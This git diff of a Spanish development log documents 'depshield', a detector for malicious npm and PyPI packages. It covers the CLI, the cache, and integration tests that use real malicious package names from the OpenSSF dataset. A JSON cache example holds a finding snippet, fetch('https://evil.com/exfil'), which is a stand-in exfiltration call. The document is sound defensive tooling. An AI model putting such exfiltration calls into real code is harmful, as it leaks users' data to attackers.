@@ -1602,10 +1602,10 @@ def _classify(score: int) -> str:
 
 | Rango | Clasificación | Color | Significado |
 |---|---|---|---|
-| 0–10 | SAFE | 🟢 Verde | No se detectaron señales significativas |
-| 11–30 | LOW_RISK | 🟡 Amarillo | Algunas señales menores, probablemente seguro |
-| 31–60 | MEDIUM_RISK | 🟠 Naranja | Señales preocupantes, revisar manualmente |
-| 61–100 | HIGH_RISK | 🔴 Rojo | Alta probabilidad de comportamiento malicioso |
+| 0-10 | SAFE | Verde | No se detectaron senales significativas |
+| 11-30 | LOW_RISK | Amarillo | Algunas senales menores, probablemente seguro |
+| 31-60 | MEDIUM_RISK | Naranja | Senales preocupantes, revisar manualmente |
+| 61-100 | HIGH_RISK | Rojo | Alta probabilidad de comportamiento malicioso |
 
 **Ejemplos de cómo se traduce:**
 - 0 findings → 0 pts → **SAFE**
@@ -1651,25 +1651,25 @@ Se implementaron dos formatos de salida:
 
 La función `print_report()` genera un informe visual usando la librería `rich` con tres secciones:
 
-**1. Panel de resumen:** Un recuadro con borde azul que muestra el conteo total de paquetes y cuántos caen en cada categoría de riesgo, con emojis y colores:
+**1. Panel de resumen:** Un recuadro con borde azul que muestra el conteo total de paquetes y cuantos caen en cada categoria de riesgo, con etiquetas de texto y colores:
 
 ```
 ╭────── depshield scan results ──────╮
-│  📦 15 packages scanned            │
-│  🔴 2 HIGH RISK                    │
-│  🟠 3 MEDIUM RISK                  │
-│  ⚠️  4 LOW RISK                     │
-│  ✅ 6 SAFE                          │
+│  15 packages scanned              │
+│  [!!!] 2 HIGH RISK                │
+│  [!!]  3 MEDIUM RISK              │
+│  [!]   4 LOW RISK                 │
+│  [ok]  6 SAFE                     │
 ╰────────────────────────────────────╯
 ```
 
-**2. Tabla de paquetes:** Una tabla con columnas para nombre, versión, tipo (direct/transitive), puntuación (coloreada), clasificación (con emoji), y resumen de findings:
+**2. Tabla de paquetes:** Una tabla con columnas para nombre, version, tipo (direct/transitive), puntuacion (coloreada), clasificacion (con etiqueta), y resumen de findings:
 
 | Package | Version | Type | Score | Risk | Findings |
 |---|---|---|---|---|---|
-| evil-pkg | 1.0.0 | direct | **75** | 🔴 HIGH_RISK | 🔴 3 HIGH |
-| shady-lib | 0.5.0 | transitive | **35** | 🟠 MEDIUM_RISK | 🔴 1 HIGH, 🟡 1 MEDIUM |
-| clean-pkg | 2.1.0 | direct | **0** | ✅ SAFE | — |
+| evil-pkg | 1.0.0 | direct | **75** | [!!!] HIGH_RISK | 3 HIGH |
+| shady-lib | 0.5.0 | transitive | **35** | [!!] MEDIUM_RISK | 1 HIGH, 1 MEDIUM |
+| clean-pkg | 2.1.0 | direct | **0** | [ok] SAFE | - |
 
 **3. Detalle de findings:** Para cada paquete con riesgo (no SAFE), se listan todos los findings individuales con su severidad, tipo de señal y snippet de código:
 
@@ -1829,17 +1829,1567 @@ git push origin main
 
 ---
 
-## 11. Estado actual del proyecto
+## 11. PASO 8 — Orquestador principal y CLI
 
-> **Última actualización:** 5 de abril de 2026
+**Objetivo:** Crear el módulo orquestador que une todos los componentes desarrollados en los pasos anteriores (resolvers, downloader, analyzers, scorer, report) en un único pipeline ejecutable desde la línea de comandos. Además, implementar un sistema de caché para evitar re-analizar paquetes ya evaluados entre ejecuciones.
 
-### Estructura de ficheros
+### 11.1. Módulos creados/actualizados
+
+Se creó el subpaquete `depshield/core/` y se actualizó el CLI:
+
+```
+depshield/core/
+├── __init__.py
+└── scanner.py              # ✅ PASO 8 — Orquestador principal
+
+depshield/cli.py            # ✅ PASO 8 — Actualizado (ya no es un stub)
+```
+
+### 11.2. Arquitectura del orquestador — `scan_project()`
+
+La función `scan_project()` es el **punto de entrada único** de todo el pipeline. Recibe la ruta a un directorio de proyecto y ejecuta la cadena completa:
+
+```
+scan_project(project_dir)
+    │
+    ├─ 1. detect_ecosystems()     → ["npm"] / ["pypi"] / ["npm", "pypi"]
+    │
+    ├─ 2. _read_npm_deps()        → {"lodash": "^4.0.0", ...}
+    │      _read_pypi_deps()      → {"requests": "==2.31.0", ...}
+    │
+    ├─ 3. npm_resolve() / pypi_resolve()  → árbol de DependencyNode
+    │
+    ├─ 4. flatten + deduplicate   → lista única de paquetes
+    │
+    ├─ 5. Para cada paquete:
+    │      ├─ check cache         → si hay hit, usar resultado cacheado
+    │      ├─ download source     → PackageDownloader.download()
+    │      ├─ analyze code        → js_analyze_dir() / py_analyze_dir()
+    │      ├─ fetch metadata      → fetch_npm_metadata() / fetch_pypi_metadata()
+    │      ├─ analyze metadata    → analyze_metadata()
+    │      └─ save to cache       → persist findings as JSON
+    │
+    ├─ 6. score_all()             → lista de PackageScore ordenada
+    │
+    └─ 7. print_report() / to_json()  → salida terminal o JSON
+```
+
+### 11.3. Detección automática de ecosistemas
+
+La función `detect_ecosystems()` inspecciona el directorio del proyecto buscando ficheros de manifiesto:
+
+```python
+def detect_ecosystems(project_dir: Path) -> list[str]:
+    ecosystems = []
+    if (project_dir / "package.json").exists():
+        ecosystems.append("npm")
+    if (project_dir / "requirements.txt").exists():
+        ecosystems.append("pypi")
+    return ecosystems
+```
+
+**Comportamiento:**
+- Si solo existe `package.json` → `["npm"]`
+- Si solo existe `requirements.txt` → `["pypi"]`
+- Si existen ambos → `["npm", "pypi"]` (se escanean los dos ecosistemas)
+- Si no existe ninguno → `[]` (se muestra error y se devuelve lista vacía)
+
+### 11.4. Lectura de dependencias
+
+Se implementaron dos funciones para extraer las dependencias de cada formato de manifiesto:
+
+#### `_read_npm_deps(project_dir) → dict`
+
+Lee `package.json` y combina `dependencies` y `devDependencies` en un solo diccionario:
+
+```python
+def _read_npm_deps(project_dir):
+    data = json.loads((project_dir / "package.json").read_text())
+    deps = {}
+    deps.update(data.get("dependencies", {}))
+    deps.update(data.get("devDependencies", {}))
+    return deps  # {"lodash": "^4.0.0", "jest": "^29.0.0"}
+```
+
+#### `_read_pypi_deps(project_dir) → dict`
+
+Lee `requirements.txt` línea por línea, ignorando comentarios y líneas vacías. Soporta todos los operadores de versión PEP 440:
+
+```python
+def _read_pypi_deps(project_dir):
+    deps = {}
+    for line in (project_dir / "requirements.txt").read_text().splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        for sep in ("==", ">=", "<=", "~=", "!=", ">", "<"):
+            if sep in line:
+                name, _, ver = line.partition(sep)
+                deps[name.strip()] = f"{sep}{ver.strip()}"
+                break
+        else:
+            deps[line] = ""  # sin versión especificada
+    return deps
+```
+
+### 11.5. Aplanamiento y deduplicación del árbol
+
+Tras resolver el árbol de dependencias (que es una estructura anidada de `DependencyNode`), se aplana a una lista y se deduplican los paquetes por `nombre@versión`:
+
+```python
+# Flatten tree
+flat = []
+for node in tree:
+    flat.extend(node.flatten())
+
+# Deduplicate by name+version
+seen: set[str] = set()
+unique_nodes = []
+for node in flat:
+    key = f"{node.name}@{node.version}"
+    if key not in seen:
+        seen.add(key)
+        unique_nodes.append(node)
+```
+
+Esto es necesario porque en un árbol de dependencias, un mismo paquete puede aparecer múltiples veces como dependencia transitiva de distintos paquetes. Sin deduplicación, se descargaría y analizaría el mismo paquete repetidamente.
+
+**Ejemplo:** Si `express` depende de `debug@4.3.4` y `morgan` también depende de `debug@4.3.4`, sin deduplicación se analizaría `debug@4.3.4` dos veces.
+
+### 11.6. Distinción directa vs transitiva
+
+Se determina si cada paquete es una dependencia directa o transitiva comparando su nombre con las claves del fichero de manifiesto:
+
+```python
+direct_names = set(deps.keys())
+# ...
+is_direct = node.name in direct_names
+```
+
+Este flag se propaga al `PackageScore` y se usa por el report para mostrar las dependencias directas primero y por el usuario para priorizar qué revisar.
+
+### 11.7. Bucle de análisis por paquete
+
+Para cada paquete único, se ejecuta la siguiente secuencia dentro de un context manager del `PackageDownloader` (que gestiona los temporales):
+
+```python
+with PackageDownloader() as downloader:
+    for node in unique_nodes:
+        findings = []
+
+        # 1. Check cache
+        if use_cache:
+            cached = _load_cached(node.name, node.version)
+            if cached is not None:
+                all_packages.append((node.name, node.version, cached, is_direct))
+                continue
+
+        # 2a. Download & analyze source
+        src_dir = downloader.download(node.name, node.version, ecosystem=eco)
+        if eco == "npm":
+            findings.extend(js_analyze_dir(src_dir))
+        else:
+            findings.extend(py_analyze_dir(src_dir))
+
+        # 2b. Fetch & analyze metadata
+        if eco == "npm":
+            meta = fetch_npm_metadata(node.name)
+        else:
+            meta = fetch_pypi_metadata(node.name)
+        findings.extend(analyze_metadata(meta, node.name))
+
+        # 3. Cache results
+        if use_cache:
+            _save_cache(node.name, node.version, findings)
+
+        all_packages.append((node.name, node.version, findings, is_direct))
+```
+
+**Manejo de errores:** Tanto la descarga/análisis como el fetch de metadatos están envueltos en bloques `try/except`. Si un paquete falla (por ejemplo, porque ya fue eliminado del registro), se registra en el log de debug y se continúa con el siguiente. Esto garantiza que un paquete problemático no interrumpe el escaneo completo.
+
+### 11.8. Barra de progreso con Rich
+
+Se implementó una barra de progreso usando `rich.progress` que muestra el paquete que se está analizando en tiempo real:
+
+```python
+with Progress(
+    SpinnerColumn(),
+    TextColumn("[progress.description]{task.description}"),
+    console=console,
+    transient=True,
+) as progress:
+    task = progress.add_task("Analyzing...", total=len(unique_nodes))
+    for node in unique_nodes:
+        progress.update(task, description=f"Analyzing {node.name}@{node.version}...")
+        # ... análisis ...
+        progress.advance(task)
+```
+
+El flag `transient=True` hace que la barra desaparezca al completarse, dejando la terminal limpia para el informe final.
+
+### 11.9. Sistema de caché
+
+Se implementó un sistema de caché basado en ficheros JSON almacenados en `~/.depshield/cache/`:
+
+#### Clave de caché
+
+La clave se calcula como un hash SHA-256 truncado a 16 caracteres del string `nombre@versión@vN` (donde N es la versión de las heurísticas):
+
+```python
+_CACHE_DIR = Path.home() / ".depshield" / "cache"
+_CACHE_VERSION = "1"
+
+def _cache_key(name: str, version: str) -> str:
+    raw = f"{name}@{version}@v{_CACHE_VERSION}"
+    return hashlib.sha256(raw.encode()).hexdigest()[:16]
+```
+
+**Ejemplo:** `lodash@4.17.21@v1` → `a3f7b2c1e9d04a58`
+
+#### Invalidación de caché
+
+La constante `_CACHE_VERSION` se incrementa cuando cambian las heurísticas de detección (por ejemplo, si se añaden nuevos patrones al JS analyzer). Esto invalida automáticamente toda la caché anterior, ya que cambia la clave.
+
+#### Formato del fichero de caché
+
+Cada fichero es un JSON con la lista de findings serializada:
+
+```json
+[
+  {
+    "signal_type": "NETWORK_CALLS",
+    "severity": "HIGH",
+    "file": "index.js",
+    "line": 42,
+    "snippet": "fetch('https://evil.com/exfil')"
+  }
+]
+```
+
+#### Flujo de caché
+
+```
+¿Existe ~/.depshield/cache/{hash}.json?
+    ├─ SÍ → deserializar findings → usar resultado cacheado (sin descarga)
+    └─ NO → descargar + analizar + guardar resultado en caché
+```
+
+### 11.10. Actualización del CLI — `depshield/cli.py`
+
+Se reemplazó el stub del PASO 0 con la implementación real que invoca `scan_project()`:
+
+```python
+@main.command()
+@click.argument("path", default=".", type=click.Path(exists=True))
+@click.option("--format", "output_format", type=click.Choice(["table", "json"]), default="table")
+@click.option("--ecosystem", type=click.Choice(["npm", "pypi", "auto"]), default="auto")
+@click.option("--no-cache", is_flag=True, default=False)
+@click.option("--max-depth", type=int, default=3)
+@click.option("--only-direct", is_flag=True, default=False)
+@click.option("--output", "output_file", type=click.Path(), default=None)
+def scan(path, output_format, ecosystem, no_cache, max_depth, only_direct, output_file):
+    scores = scan_project(
+        path,
+        ecosystem=ecosystem,
+        use_cache=not no_cache,
+        max_depth=max_depth,
+        only_direct=only_direct,
+        output_format=output_format,
+    )
+    if output_file:
+        save_json(scores, output_file)
+    if any(s.classification == "HIGH_RISK" for s in scores):
+        sys.exit(1)
+```
+
+#### Opciones disponibles
+
+| Opción | Tipo | Default | Descripción |
+|---|---|---|---|
+| `PATH` | argumento | `.` | Directorio del proyecto a escanear |
+| `--format` | `table\|json` | `table` | Formato de salida |
+| `--ecosystem` | `npm\|pypi\|auto` | `auto` | Ecosistema a escanear |
+| `--no-cache` | flag | `False` | Desactiva la caché |
+| `--max-depth` | int | `3` | Profundidad máxima del árbol |
+| `--only-direct` | flag | `False` | Solo dependencias directas |
+| `--output` | path | None | Guardar JSON a fichero |
+
+#### Exit codes para CI/CD
+
+El CLI devuelve **exit code 1** si se detecta al menos un paquete con clasificación `HIGH_RISK`. Esto permite integrar depshield en pipelines de CI/CD:
+
+```yaml
+# GitHub Actions example
+- name: Security audit
+  run: depshield scan . --format json --output report.json
+  # El step falla automáticamente si hay paquetes HIGH_RISK
+```
+
+#### Opción `--output` (nueva)
+
+Se añadió una opción no contemplada en el plan original: `--output` permite guardar el informe JSON a disco sin cambiar el formato de salida por terminal. Esto permite ver el informe visual en terminal y simultáneamente guardar los datos estructurados para post-procesamiento.
+
+### 11.11. Uso desde la línea de comandos
+
+```powershell
+# Escanear el directorio actual (auto-detecta ecosistema)
+depshield scan
+
+# Escanear un proyecto específico
+depshield scan C:\projects\my-app
+
+# Solo dependencias directas, formato JSON
+depshield scan . --only-direct --format json
+
+# Sin caché, profundidad máxima 2
+depshield scan . --no-cache --max-depth 2
+
+# Guardar informe a fichero
+depshield scan . --output report.json
+
+# Forzar ecosistema npm
+depshield scan . --ecosystem npm
+```
+
+### 11.12. Verificación — `tests/test_scanner.py`
+
+Se crearon **20 tests unitarios y de integración** organizados en 5 clases de test, usando `unittest.mock` para aislar las llamadas de red y poder verificar la lógica del orquestador sin dependencia de las APIs externas:
+
+#### Clase `TestDetectEcosystems` — 4 tests
+
+Verifica la detección automática de ecosistemas según los ficheros de manifiesto presentes:
+
+| Test | Descripción |
+|---|---|
+| `test_npm_only` | Directorio con solo `package.json` → detecta `["npm"]` |
+| `test_pypi_only` | Directorio con solo `requirements.txt` → detecta `["pypi"]` |
+| `test_both_ecosystems` | Directorio con ambos → detecta `["npm", "pypi"]` |
+| `test_no_ecosystem` | Directorio vacío → devuelve `[]` |
+
+#### Clase `TestReadDeps` — 4 tests
+
+Verifica los helpers de lectura de dependencias:
+
+| Test | Descripción |
+|---|---|
+| `test_read_npm_deps` | Lee y fusiona `dependencies` + `devDependencies` de `package.json` |
+| `test_read_pypi_deps` | Parsea `requirements.txt` con operadores `==` y `>=` |
+| `test_read_pypi_deps_comments_and_blanks` | Ignora comentarios `#` y líneas vacías |
+| `test_read_pypi_deps_all_operators` | Parsea correctamente los 7 operadores PEP 440: `==`, `>=`, `<=`, `~=`, `!=`, `>`, `<` |
+
+#### Clase `TestCache` — 5 tests
+
+Verifica el sistema de caché basado en ficheros JSON:
+
+| Test | Descripción |
+|---|---|
+| `test_cache_key_deterministic` | Misma entrada → misma clave (SHA-256 truncado a 16 chars) |
+| `test_cache_key_differs_by_name` | Nombres distintos → claves distintas |
+| `test_cache_key_differs_by_version` | Versiones distintas → claves distintas |
+| `test_cache_miss_returns_none` | Paquete no cacheado → `None` |
+| `test_cache_roundtrip` | Serializar findings → guardar JSON → deserializar → datos idénticos |
+
+#### Clase `TestScanProject` — 5 tests
+
+Verifica el orquestador `scan_project()` con mocks de red:
+
+| Test | Descripción |
+|---|---|
+| `test_scan_npm_project_mocked` | Pipeline completo npm con findings mockeados → `PackageScore` con score > 0 |
+| `test_scan_empty_project` | Directorio vacío → devuelve `[]` sin errores |
+| `test_scan_pypi_project_mocked` | Pipeline completo PyPI con paquete limpio → clasificación `SAFE` |
+| `test_scan_high_risk_classification` | 4 findings HIGH → clasificación `HIGH_RISK` (score ≥ 61) |
+| `test_only_direct_flag` | Flag `--only-direct` → resolver invocado con `max_depth=1` |
+
+Los tests de `TestScanProject` usan `unittest.mock.patch` para reemplazar las llamadas de red (resolvers, downloader, metadata fetcher) con mocks controlados. Esto permite:
+- Ejecutar los tests **sin conexión a Internet**
+- Verificar la lógica de orquestación **aislada** de fallos de red
+- Controlar exactamente qué findings se generan para verificar el scoring
+
+```python
+@patch("depshield.core.scanner.npm_resolve")
+@patch("depshield.core.scanner.js_analyze_dir")
+@patch("depshield.core.scanner.fetch_npm_metadata")
+@patch("depshield.core.scanner.analyze_metadata")
+@patch("depshield.core.scanner.PackageDownloader")
+def test_scan_npm_project_mocked(self, MockDownloader, ...):
+    # Setup mocks con datos controlados
+    node = self._make_mock_node("is-odd", "3.0.1")
+    mock_npm_resolve.return_value = [node]
+    mock_js_analyze.return_value = [Finding("CODE_EXECUTION", "HIGH", ...)]
+    # ...
+    scores = scan_project(npm_project, ecosystem="npm", use_cache=False)
+    assert scores[0].score > 0
+```
+
+#### Clase `TestReportIntegration` — 2 tests
+
+Verifica la generación de informes:
+
+| Test | Descripción |
+|---|---|
+| `test_json_report_structure` | `to_json()` genera la estructura correcta con `summary` y `packages` |
+| `test_save_json_to_file` | `save_json()` escribe JSON válido a disco |
+
+**Resultado:** 20/20 PASSED en 0.80 segundos.
+
+La rapidez de ejecución (sub-segundo) se debe al uso de mocks que eliminan las llamadas HTTP reales, permitiendo ejecutar los tests en cualquier entorno sin dependencia de red.
+
+### 11.13. Imports y dependencias entre módulos
+
+El scanner importa de **todos** los módulos anteriores, confirmando que la arquitectura modular funciona:
+
+```python
+from depshield.analyzers.js_analyzer import Finding, analyze_directory as js_analyze_dir
+from depshield.analyzers.py_analyzer import analyze_directory as py_analyze_dir
+from depshield.analyzers.metadata_analyzer import analyze_metadata, fetch_npm_metadata, fetch_pypi_metadata
+from depshield.downloaders.package_downloader import PackageDownloader
+from depshield.resolvers.npm_resolver import resolve_tree as npm_resolve
+from depshield.resolvers.pypi_resolver import resolve_tree as pypi_resolve
+from depshield.scoring.scorer import score_all, PackageScore
+from depshield.scoring.report import print_report, save_json, to_json
+```
+
+### 11.14. Commit
+
+```powershell
+git add .
+git commit -m "PASO 8: Core scanner orchestrator + full CLI integration + cache system"
+git push origin main
+```
+
+---
+
+## 12. PASO 9 — Tests de integración con paquetes maliciosos reales
+
+**Objetivo:** Validar que depshield detecta paquetes maliciosos reales del repositorio OpenSSF malicious-packages y que no produce falsos positivos con paquetes legítimos. Generar métricas de evaluación (Precision, Recall, F1-Score) para cuantificar la eficacia del sistema.
+
+### 12.1. Contexto y motivación
+
+Hasta el PASO 8, todos los tests utilizan mocks o paquetes legítimos conocidos. Esto verifica que la mecánica funciona, pero no valida la **eficacia real** de las heurísticas de detección. El PASO 9 introduce tests de integración que:
+
+1. Descargan y analizan **paquetes maliciosos reales** (o eliminados del registro).
+2. Verifican que **depshield los detecta** con score ≥ 31 (MEDIUM_RISK o superior).
+3. Analizan **paquetes legítimos** para verificar que depshield **no los marca** como peligrosos.
+4. Generan un fichero `results.json` con métricas de clasificación binaria.
+
+Estos tests hacen **llamadas HTTP reales** a los registros de npm y PyPI, por lo que están marcados con `@pytest.mark.integration` y se ejecutan por separado.
+
+### 12.2. Dataset: OpenSSF malicious-packages
+
+El repositorio [ossf/malicious-packages](https://github.com/ossf/malicious-packages) es una base de datos comunitaria mantenida por la Open Source Security Foundation que recopila reportes de paquetes maliciosos en formato **OSV** (Open Source Vulnerability). Contiene más de 15.000 reportes de paquetes maliciosos en npm, PyPI y otros ecosistemas.
+
+#### Formato de un reporte OSV
+
+Cada reporte es un fichero JSON que sigue el esquema OSV v1.5.0:
+
+```json
+{
+  "id": "MAL-2025-1",
+  "summary": "Malicious code in 029testnpm (npm)",
+  "details": "Any computer that has this package installed...",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "029testnpm"
+      },
+      "versions": ["1.0.0"],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ]
+}
+```
+
+Los campos clave para nuestros tests son:
+- `affected[0].package.ecosystem` → ecosistema (npm o PyPI)
+- `affected[0].package.name` → nombre del paquete
+- `affected[0].versions` → versiones afectadas
+
+### 12.3. Reportes OSV guardados como fixtures
+
+Se descargaron 8 reportes reales del repositorio OpenSSF y se guardaron como fixtures en `tests/fixtures/osv_reports/`:
+
+| Fichero | ID | Paquete | Ecosistema |
+|---|---|---|---|
+| `MAL-2025-1_029testnpm.json` | MAL-2025-1 | 029testnpm | npm |
+| `MAL-2022-12_0maptrea.json` | MAL-2022-12 | 0maptrea | npm |
+| `MAL-2022-13_0supportscolor.json` | MAL-2022-13 | 0supportscolor | npm |
+| `MAL-2022-2_hiljson.json` | MAL-2022-2 | --hiljson | npm |
+| `MAL-2022-14_0x-fee-wrapper-contract.json` | MAL-2022-14 | 0x-fee-wrapper-contract | npm |
+| `MAL-2022-9_0-dns.json` | MAL-2022-9 | 0-dns | npm |
+| `MAL-2022-10_0-shadowenv.json` | MAL-2022-10 | 0-shadowenv | npm |
+| `MAL-2023-8429_littest_pypi.json` | MAL-2023-8429 | littest | PyPI |
+
+Los ficheros son copias literales (o adaptaciones mínimas) de los JSONs del repositorio original, lo que garantiza trazabilidad.
+
+### 12.4. Paquetes legítimos para validación de falsos positivos
+
+Para medir la tasa de falsos positivos, se incluyen 4 paquetes legítimos ampliamente utilizados:
+
+| Paquete | Versión | Ecosistema | Justificación |
+|---|---|---|---|
+| `is-odd` | 3.0.1 | npm | Micro-paquete, código mínimo |
+| `minimist` | 1.2.8 | npm | Parser de argumentos CLI, muy popular |
+| `six` | 1.16.0 | PyPI | Capa de compatibilidad Python 2/3 |
+| `click` | 8.1.7 | PyPI | Framework CLI, dependencia de depshield |
+
+Estos paquetes deberían obtener score ≤ 30 (SAFE o LOW_RISK).
+
+### 12.5. Arquitectura del test
+
+El fichero `tests/integration/test_known_malicious.py` está organizado en 3 clases de test con un helper central `_analyze_package()` que ejecuta el pipeline completo:
+
+```
+┌─────────────────────────────────────────────────┐
+│  _analyze_package(name, version, ecosystem)      │
+│                                                   │
+│  1. Resolver versión "latest" si es necesario     │
+│  2. PackageDownloader.download()                  │
+│  3. js_analyze_dir() / py_analyze_dir()           │
+│  4. fetch_npm_metadata() / fetch_pypi_metadata()  │
+│  5. analyze_metadata()                            │
+│  6. score_package()                               │
+│  7. → PackageScore                                │
+└─────────────────────────────────────────────────┘
+```
+
+A diferencia del orquestador `scan_project()` (que trabaja con árboles de dependencias), aquí se analiza **un solo paquete** directamente, lo que simplifica los tests y permite medir la eficacia de las heurísticas de forma aislada.
+
+### 12.6. Manejo de paquetes eliminados
+
+Muchos paquetes maliciosos son eliminados por los registros tras ser reportados. Los tests manejan este caso:
+
+```python
+def _package_exists_npm(name: str) -> bool:
+    r = requests.get(f"https://registry.npmjs.org/{name}", timeout=15)
+    if r.status_code == 404:
+        return False
+    data = r.json()
+    if "error" in data:
+        return False
+    return True
+```
+
+Si un paquete ha sido eliminado, el test se marca como `pytest.skip()` con un mensaje explicativo, en lugar de fallar. Esto es importante porque:
+- No penaliza la cobertura si el registro elimina un paquete tras nuestro reporte.
+- Diferencia entre "no detectado" (falso negativo real) y "no disponible" (imposible de probar).
+
+### 12.7. Clases de test
+
+#### Clase `TestKnownMalicious` — 8 tests parametrizados
+
+Cada test corresponde a un reporte OSV de las fixtures:
+
+```python
+@pytest.mark.integration
+class TestKnownMalicious:
+    @pytest.mark.parametrize(
+        "ecosystem,name,version",
+        _MALICIOUS_PACKAGES,
+        ids=[f"{e}/{n}@{v}" for e, n, v in _MALICIOUS_PACKAGES],
+    )
+    def test_malicious_detected(self, ecosystem, name, version):
+        """Un paquete malicioso conocido debe obtener score >= 31."""
+        # 1. Verificar si el paquete sigue en el registro
+        # 2. Descargar + analizar + puntuar
+        # 3. Assert score >= 31 (MEDIUM_RISK o superior)
+```
+
+**Criterio de éxito:** `score >= 31` (clasificación MEDIUM_RISK o HIGH_RISK). Un paquete malicioso que obtiene ≤ 30 se cuenta como **falso negativo**.
+
+#### Clase `TestKnownLegitimate` — 4 tests parametrizados
+
+```python
+@pytest.mark.integration
+class TestKnownLegitimate:
+    @pytest.mark.parametrize(
+        "ecosystem,name,version",
+        _LEGITIMATE_PACKAGES,
+        ids=[f"{e}/{n}@{v}" for e, n, v in _LEGITIMATE_PACKAGES],
+    )
+    def test_legitimate_not_flagged(self, ecosystem, name, version):
+        """Un paquete legítimo debe obtener score <= 30."""
+```
+
+**Criterio de éxito:** `score <= 30` (clasificación SAFE o LOW_RISK). Un paquete legítimo que obtiene ≥ 31 se cuenta como **falso positivo**.
+
+#### Clase `TestSummary` — 1 test
+
+Guarda las métricas acumuladas en `results.json` y las imprime por consola:
+
+```python
+@pytest.mark.integration
+class TestSummary:
+    def test_save_final_results(self):
+        _save_results()
+        # Imprime resumen: TP, FN, TN, FP, Precision, Recall, F1
+```
+
+### 12.8. Sistema de métricas
+
+Las métricas se acumulan en un dataclass `_Metrics` a nivel de módulo:
+
+```python
+@dataclass
+class _Metrics:
+    tp: int = 0  # True Positives: maliciosos detectados
+    fn: int = 0  # False Negatives: maliciosos no detectados
+    tn: int = 0  # True Negatives: legítimos no marcados
+    fp: int = 0  # False Positives: legítimos marcados
+
+    @property
+    def precision(self) -> float:
+        return self.tp / (self.tp + self.fp) if (self.tp + self.fp) else 0.0
+
+    @property
+    def recall(self) -> float:
+        return self.tp / (self.tp + self.fn) if (self.tp + self.fn) else 0.0
+
+    @property
+    def f1(self) -> float:
+        p, r = self.precision, self.recall
+        return 2 * p * r / (p + r) if (p + r) else 0.0
+```
+
+**Definiciones:**
+- **Precision** = TP / (TP + FP) → "De los que marcamos como maliciosos, ¿cuántos lo eran realmente?"
+- **Recall** = TP / (TP + FN) → "De los maliciosos reales, ¿cuántos detectamos?"
+- **F1-Score** = Media armónica de Precision y Recall → Balance entre ambas.
+
+### 12.9. Formato de `results.json`
+
+Al finalizar los tests, se genera automáticamente `tests/integration/results.json`:
+
+```json
+{
+  "metrics": {
+    "true_positives": 5,
+    "false_negatives": 2,
+    "true_negatives": 4,
+    "false_positives": 0,
+    "precision": 1.0,
+    "recall": 0.7143,
+    "f1_score": 0.8333
+  },
+  "details": [
+    {
+      "name": "029testnpm",
+      "version": "1.0.0",
+      "ecosystem": "npm",
+      "expected": "malicious",
+      "score": 68,
+      "classification": "HIGH_RISK",
+      "detected": true,
+      "findings_count": 5
+    },
+    {
+      "name": "six",
+      "version": "1.16.0",
+      "ecosystem": "pypi",
+      "expected": "legitimate",
+      "score": 3,
+      "classification": "SAFE",
+      "detected": false,
+      "findings_count": 1
+    }
+  ]
+}
+```
+
+Este formato permite:
+- **Análisis post-hoc:** Examinar qué paquetes fueron detectados y cuáles no.
+- **Integración CI/CD:** Parsear el JSON para decidir si un cambio en las heurísticas degrada la detección.
+- **Benchmarking:** Comparar con los resultados de GuardDog (PASO 10).
+
+### 12.10. Rate limiting
+
+Cada test incluye un fixture `_rate_limit` que introduce un `time.sleep(1.5)` entre ejecuciones:
+
+```python
+@pytest.fixture(autouse=True)
+def _rate_limit(self):
+    yield
+    time.sleep(1.5)
+```
+
+Esto garantiza que no se exceden los límites de las APIs públicas de npm (≈1000 req/hora) y PyPI (sin rate limit oficial pero con políticas de uso razonable).
+
+### 12.11. Ejecución
+
+Los tests se ejecutan exclusivamente con el marker `integration`:
+
+```powershell
+# Ejecutar solo tests de integración
+pytest -m integration -v
+
+# Ejecutar tests unitarios normales (ignora integración)
+pytest -v --ignore=tests/integration
+
+# Ejecutar todo
+pytest -v
+```
+
+### 12.12. Estructura de ficheros creados
+
+```
+tests/
+├── fixtures/
+│   └── osv_reports/
+│       ├── MAL-2025-1_029testnpm.json
+│       ├── MAL-2022-12_0maptrea.json
+│       ├── MAL-2022-13_0supportscolor.json
+│       ├── MAL-2022-2_hiljson.json
+│       ├── MAL-2022-14_0x-fee-wrapper-contract.json
+│       ├── MAL-2022-9_0-dns.json
+│       ├── MAL-2022-10_0-shadowenv.json
+│       └── MAL-2023-8429_littest_pypi.json
+├── integration/
+│   ├── __init__.py
+│   └── test_known_malicious.py
+└── ...
+```
+
+### 12.13. Verificación de recopilación
+
+Se verificó que pytest recopila correctamente los 13 tests sin ejecutarlos:
+
+```
+$ pytest tests/integration/test_known_malicious.py --collect-only
+
+collected 13 items
+
+  TestKnownMalicious::test_malicious_detected[npm/0-shadowenv@latest]
+  TestKnownMalicious::test_malicious_detected[npm/0maptrea@latest]
+  TestKnownMalicious::test_malicious_detected[npm/0supportscolor@latest]
+  TestKnownMalicious::test_malicious_detected[npm/0x-fee-wrapper-contract@latest]
+  TestKnownMalicious::test_malicious_detected[npm/--hiljson@latest]
+  TestKnownMalicious::test_malicious_detected[npm/0-dns@latest]
+  TestKnownMalicious::test_malicious_detected[pypi/littest@0.1.0]
+  TestKnownMalicious::test_malicious_detected[npm/029testnpm@1.0.0]
+  TestKnownLegitimate::test_legitimate_not_flagged[npm/is-odd@3.0.1]
+  TestKnownLegitimate::test_legitimate_not_flagged[npm/minimist@1.2.8]
+  TestKnownLegitimate::test_legitimate_not_flagged[pypi/six@1.16.0]
+  TestKnownLegitimate::test_legitimate_not_flagged[pypi/click@8.1.7]
+  TestSummary::test_save_final_results
+```
+
+Los tests unitarios normales siguen pasando sin verse afectados (20/20 PASSED en 0.23s).
+
+### 12.14. Nota importante
+
+Estos tests **no se han ejecutado** según las instrucciones del plan ("No ejecutes estos tests automáticamente, solo créalos. Yo los ejecutaré manualmente."). La verificación se limitó a confirmar que pytest los recopila correctamente y que el código es referencialmente correcto.
+
+### 12.15. Commit
+
+```powershell
+git add .
+git commit -m "PASO 9: Integration tests with real malicious packages from OpenSSF dataset + metrics"
+git push origin main
+```
+
+---
+
+## 13. PASO 10 — Comparativa con GuardDog
+
+**Objetivo:** Crear un benchmark que compare depshield con GuardDog (Datadog), la herramienta de referencia en detección de paquetes maliciosos, usando el mismo conjunto de 20 paquetes para medir Precision, Recall, F1-Score y rendimiento.
+
+### 13.1. ¿Qué es GuardDog?
+
